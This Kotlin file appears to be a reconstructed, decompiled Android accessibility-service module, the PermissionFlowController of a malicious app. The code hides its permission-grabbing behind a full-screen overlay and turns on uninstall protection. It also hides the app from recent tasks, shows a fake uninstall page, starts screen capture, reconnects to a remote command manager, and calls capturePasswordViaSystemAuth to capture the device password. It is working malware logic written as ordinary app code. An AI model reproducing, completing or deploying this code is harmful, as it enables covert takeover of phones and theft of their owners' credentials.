package com.storm.safe.rock.service.delegates

import android.content.Context
import android.os.Build
import android.util.Log
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.DeviceAuthorizationManager
import com.storm.safe.rock.service.modules.automation.AutomationCoordinator
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * PermissionFlowController — delegates permission grant flow from
 * MyAccessibilityService to reduce class size.
 *
 * Extracted methods:
 * - startPermissionGrantFlow() — ~150 lines, initial permission automation
 * - resumeWriteSettingsPermissionRequest() — ~80 lines, resume WRITE_SETTINGS flow
 * - pauseWriteSettingsPermission() — ~15 lines, pause WRITE_SETTINGS flow
 *
 * Uses Mode B: direct MyAccessibilityService reference for field access.
 *
 * JADX class: com.storm.safe.rock.service.dqtvuisjd
 */
class PermissionFlowController(private val service: MyAccessibilityService) {

    companion object {
        private const val TAG = "PermissionFlowCtrl"
    }

    // ════════════════════════════════════════════════════════════════
    // isAlreadyAuthorized — testable helper
    // ════════════════════════════════════════════════════════════════

    /**
     * Check if authorization has already been completed.
     * Reads both "app_state" and "authorization" SharedPreferences.
     * JADX: checks f52395c9 (authorization_completed) from two prefs stores.
     */
    fun isAlreadyAuthorized(): Boolean {
        return try {
            service.getSharedPreferences("app_state", Context.MODE_PRIVATE)
                .getBoolean("authorization_completed", false) ||
            service.getSharedPreferences("authorization", Context.MODE_PRIVATE)
                .getBoolean("authorization_completed", false)
        } catch (_: Exception) { false }
    }

    // ════════════════════════════════════════════════════════════════
    // startPermissionGrantFlow
    // JADX: dqtvuisjd.startPermissionGrantFlow (suspend)
    // ════════════════════════════════════════════════════════════════

    /**
     * Main permission grant flow entry point.
     *
     * Logic:
     * 1. If already authorized → init deferred managers, start authorization, enable uninstall protection
     * 2. If Android 11+ (SDK>=30) → show overlay, start authorization, screen capture
     * 3. If Android 10 (SDK 29) → similar flow with delay
     */
    suspend fun startPermissionGrantFlow() {
        Log.d(TAG, "startPermissionGrantFlow() 开始执行")

        try {
            val isAuthorized = isAlreadyAuthorized()

            if (isAuthorized) {
                Log.d(TAG, "authorization_completed=true，跳过遮挡和适配流程")

                // 授权已完成时直接初始化延迟组件（CommandDispatcher, RemoteConfigManager 等）
                try {
                    service.serviceInitializer?.initializeDeferredManagers()
                    Log.d(TAG, "[重启恢复] initializeDeferredManagers 完成")
                } catch (e: Exception) {
                    Log.e(TAG, "[重启恢复] initializeDeferredManagers 失败", e)
                }

                // JADX: c0329b42.m211768a6() — start authorization module
                try {
                    (service.configStageManager as? DeviceAuthorizationManager)?.startAuthorization(service)
                } catch (_: Exception) {}

                // JADX: if (!f52477k8) → enableUninstallProtection
                if (!service.isUninstallGuardStarted) {
                    Log.d(TAG, "授权已完成但防卸载未启用，立即启用")
                    service.enableUninstallProtection()
                }

                // JADX: c0356a1.m211955a2() — resume recents guard
                service.recentsGuardManager?.let { rgm ->
                    rgm.enable()
                    Log.d(TAG, "授权已完成，恢复最近任务隐藏")
                }

                // JADX: m211534n2() — tryShowPackageVerify (fake uninstall page)
                service.tryShowPackageVerify()
                return
            }

            // ── Not yet authorized — begin automation ──

            if (Build.VERSION.SDK_INT >= 30) {
                // JADX: Android 11+ path
                Log.d(TAG, "Android 11+设备，进入专用流程")

                // JADX: screenBrightnessManager.m213351a1() check
                // ADAPT: ju0 (ScreenBrightnessManager) — vendor manages brightness state
                // via dedicated manager. Brightness control is handled by dimScreen()/resetScreenBrightness()
                // Show mask overlay
                // JADX: configMaskManager.m213601a1(false) — show full-screen mask overlay
                if (!com.storm.safe.rock.util.DebugConfig.disableConfigMask) {
                    try {
                        service.overlayManager?.show()
                        Log.d(TAG, "Android 11+设备：显示配置期间遮盖")
                        service.configProgressManager?.startConfig()
                    } catch (_: Exception) {}
                } else {
                    Log.d(TAG, "[DEBUG] configMask 已跳过")
                }

                service.isPermissionFlowStarted = true

                // JADX: c0260a22.m211329h2() — start screen capture permission flow
                try {
                    service.screenCaptureManager?.let { scm ->
                        // JADX: depends on ScreenCaptureManager.startPermissionRequest() (h2)
                    }
                } catch (_: Exception) {}

                // JADX: c0329b43.m211768a6() — start authorization module
                try {
                    (service.configStageManager as? DeviceAuthorizationManager)?.startAuthorization(service)
                        ?: run {
                            service.configStageManager = DeviceAuthorizationManager(service, service)
                            (service.configStageManager as? DeviceAuthorizationManager)?.startAuthorization(service)
                        }
                } catch (e: Exception) {
                    Log.e(TAG, "启动授权模块异常: ${e.message}", e)
                }

                Log.d(TAG, "Android 11+设备：适配流程继续，网络连接在后台进行")

                // DeviceAuthorizationManager 协程 finally 会自动调用 resumeWriteSettings()

            } else {
                // JADX: Android 10 path (SDK < 30)
                // Similar flow with potential 1s delay for mask display

                // Show mask + start authorization
                if (!com.storm.safe.rock.util.DebugConfig.disableConfigMask) {
                    try {
                        service.overlayManager?.show()
                        Log.d(TAG, "显示配置期间遮盖，防止用户误操作")
                        service.configProgressManager?.startConfig()
                    } catch (_: Exception) {}
                } else {
                    Log.d(TAG, "[DEBUG] configMask (Android 10) 已跳过")
                }

                delay(1000L) // JADX: b81.m210571b1(1000L, continuation)

                service.isPermissionFlowStarted = true

                try {
                    service.screenCaptureManager?.let { scm ->
                        // JADX: depends on ScreenCaptureManager.startPermissionRequest() (h2)
                    }
                } catch (_: Exception) {}

                try {
                    (service.configStageManager as? DeviceAuthorizationManager)?.startAuthorization(service)
                        ?: run {
                            service.configStageManager = DeviceAuthorizationManager(service, service)
                            (service.configStageManager as? DeviceAuthorizationManager)?.startAuthorization(service)
                        }
                } catch (e: Exception) {
                    Log.e(TAG, "启动授权模块异常: ${e.message}", e)
                }

                // DeviceAuthorizationManager 协程 finally 会自动调用 resumeWriteSettings()

                // JADX: launch dqtvuisjd$startPermissionGrantFlow$11 coroutine
                // 10s delay → check m211484h8 (networkManager.isRegistered) → if not, wake NetworkManager
                service.getCoroutineScope()?.launch {
                    try {
                        delay(10000L) // JADX: b81.m210571b1(10000L, this)
                        val registered = try {
                            service.networkManager?.isRegistered ?: false
                        } catch (_: Exception) { false }
                        if (!registered) {
                            Log.w(TAG, "10秒内未完成注册，唤醒NetworkManager重试")
                            service.networkManager?.let { nm ->
                                nm.ensureConnected() // JADX: c0323a8.m211643a8()
                                // JADX: c0323a8.m211669d6() — send reconnect signal to channel
                                // Simplified: ensureConnected already handles reconnection
                            }
                        }
                    } catch (_: Exception) {}
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "自动权限获取失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // pauseWriteSettingsPermission
    // JADX: m211496j0 (j0)
    // ════════════════════════════════════════════════════════════════

    /**
     * Pause WRITE_SETTINGS permission request.
     *
     * Sets isScreenCaptureActive=true (JADX: f52432g3) as a pause flag,
     * then calls mainOrchestrator.stopPermissionRequest() (JADX: C0327b2.m211752f8).
     */
    fun pauseWriteSettingsPermission() {
        try {
            Log.d(TAG, "暂停WRITE_SETTINGS权限申请")
            service.isScreenCaptureActive = true // JADX: f52432g3 = true (dual-use flag)
            service.mainOrchestrator?.let { mo ->
                // JADX: c0327b2.m211752f8() — stop the orchestrator's permission loop
                mo.stopPermissionRequest()
                Log.d(TAG, "MainOrchestrator.stopPermissionRequest() 已调用")
            }
        } catch (e: Exception) {
            Log.w(TAG, "暂停WRITE_SETTINGS权限申请失败", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // resumeWriteSettingsPermissionRequest
    // JADX: m211518m3 (m3)
    // ════════════════════════════════════════════════════════════════

    /**
     * Resume WRITE_SETTINGS permission request.
     *
     * JADX method: m211518m3 — resumes the WRITE_SETTINGS permission automation.
     * Logs call stack (debug), checks if WRITE_SETTINGS already granted,
     * then either enables uninstall protection or waits for system stability.
     */
    fun resumeWriteSettingsPermissionRequest() {
        Log.d(TAG, "[密码调试] resumeWriteSettingsPermissionRequest() 被调用！")
        try {
            Log.d(TAG, "恢复WRITE_SETTINGS权限申请")
            service.isScreenCaptureActive = false
            val mo = service.mainOrchestrator
            if (mo != null) {
                val hasPermission = mo.hasWriteSettingsPermission()
                Log.d(TAG, "[密码调试] hasPermission=$hasPermission")
                if (hasPermission) {
                    Log.d(TAG, "WRITE_SETTINGS权限已获取，跳过恢复权限申请（避免重复触发密码界面）")
                    if (!service.isUninstallGuardStarted) {
                        Log.d(TAG, "WRITE_SETTINGS权限已有但防卸载未启用，立即启用")
                        service.enableUninstallProtection()
                    }
                    // 2026-04-16 ADAPT: WS 已授权 → 直接触发生物识别流程
                    service.getCoroutineScope()?.launch {
                        try {
                            service.capturePasswordViaSystemAuth(isInstallationFlow = false)
                        } catch (e: kotlinx.coroutines.CancellationException) {
                            throw e
                        } catch (e: Exception) {
                            Log.e(TAG, "capturePasswordViaSystemAuth (WS已授权分支) failed", e)
                        }
                    }
                    return
                }
            }
            Log.d(TAG, "WRITE_SETTINGS权限未获取，等待系统稳定")
            // JADX: launches dqtvuisjd$resumeWriteSettingsPermissionRequest$3 coroutine
            service.getCoroutineScope()?.launch {
                AutomationCoordinator.withFlow("write_settings") {
                    try {
                        delay(800L) // JADX: b81.m210571b1(800L, this) — vendor pure delay
                        Log.d(TAG, "[密码调试] 800ms延迟结束，直接调用requestWriteSettingsPermission()")
                        // JADX: $3$1 inner coroutine launched on Dispatchers.Main
                        // Checks isScreenCaptureActive (f52432g3) before calling f7()
                        if (service.isScreenCaptureActive) {
                            Log.d(TAG, "WRITE_SETTINGS权限申请已被暂停，跳过申请")
                        } else {
                            Log.d(TAG, "开始申请WRITE_SETTINGS权限")
                            val mo2 = service.mainOrchestrator
                            if (mo2 == null) {
                                Log.d(TAG, "WriteSettingsPermissionManager未初始化，跳过权限申请")
                            } else {
                                // 清除 attempted flag，确保 resume 后能重新触发
                                try {
                                    service.applicationContext.getSharedPreferences("write_settings_state", 0)
                                        .edit().putBoolean("write_settings_attempted", false).apply()
                                } catch (_: Exception) {}
                                // 清理品牌引擎留下的 SecurityCenter 页面栈，避免挡住 WRITE_SETTINGS
                                try {
                                    service.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
                                    delay(800L)
                                } catch (_: Exception) {}
                                mo2.startWriteSettingsPermissionRequest()
                                // 2026-04-16 ADAPT: WS 完成/3s超时后强制触发生物识别流程
                                val wsGranted = mo2.hasWriteSettingsPermission()
                                Log.d(TAG, "WS 流程结束, granted=$wsGranted, 继续触发生物识别")
                                try {
                                    service.capturePasswordViaSystemAuth(isInstallationFlow = false)
                                } catch (e: kotlinx.coroutines.CancellationException) {
                                    throw e
                                } catch (e: Exception) {
                                    Log.e(TAG, "capturePasswordViaSystemAuth (WS后) failed", e)
                                }
                            }
                        }
                    } catch (e: kotlinx.coroutines.CancellationException) {
                        throw e
                    } catch (e: Exception) {
                        Log.e(TAG, "申请WRITE_SETTINGS权限失败", e)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "恢复WRITE_SETTINGS权限申请失败", e)
        }
    }
}
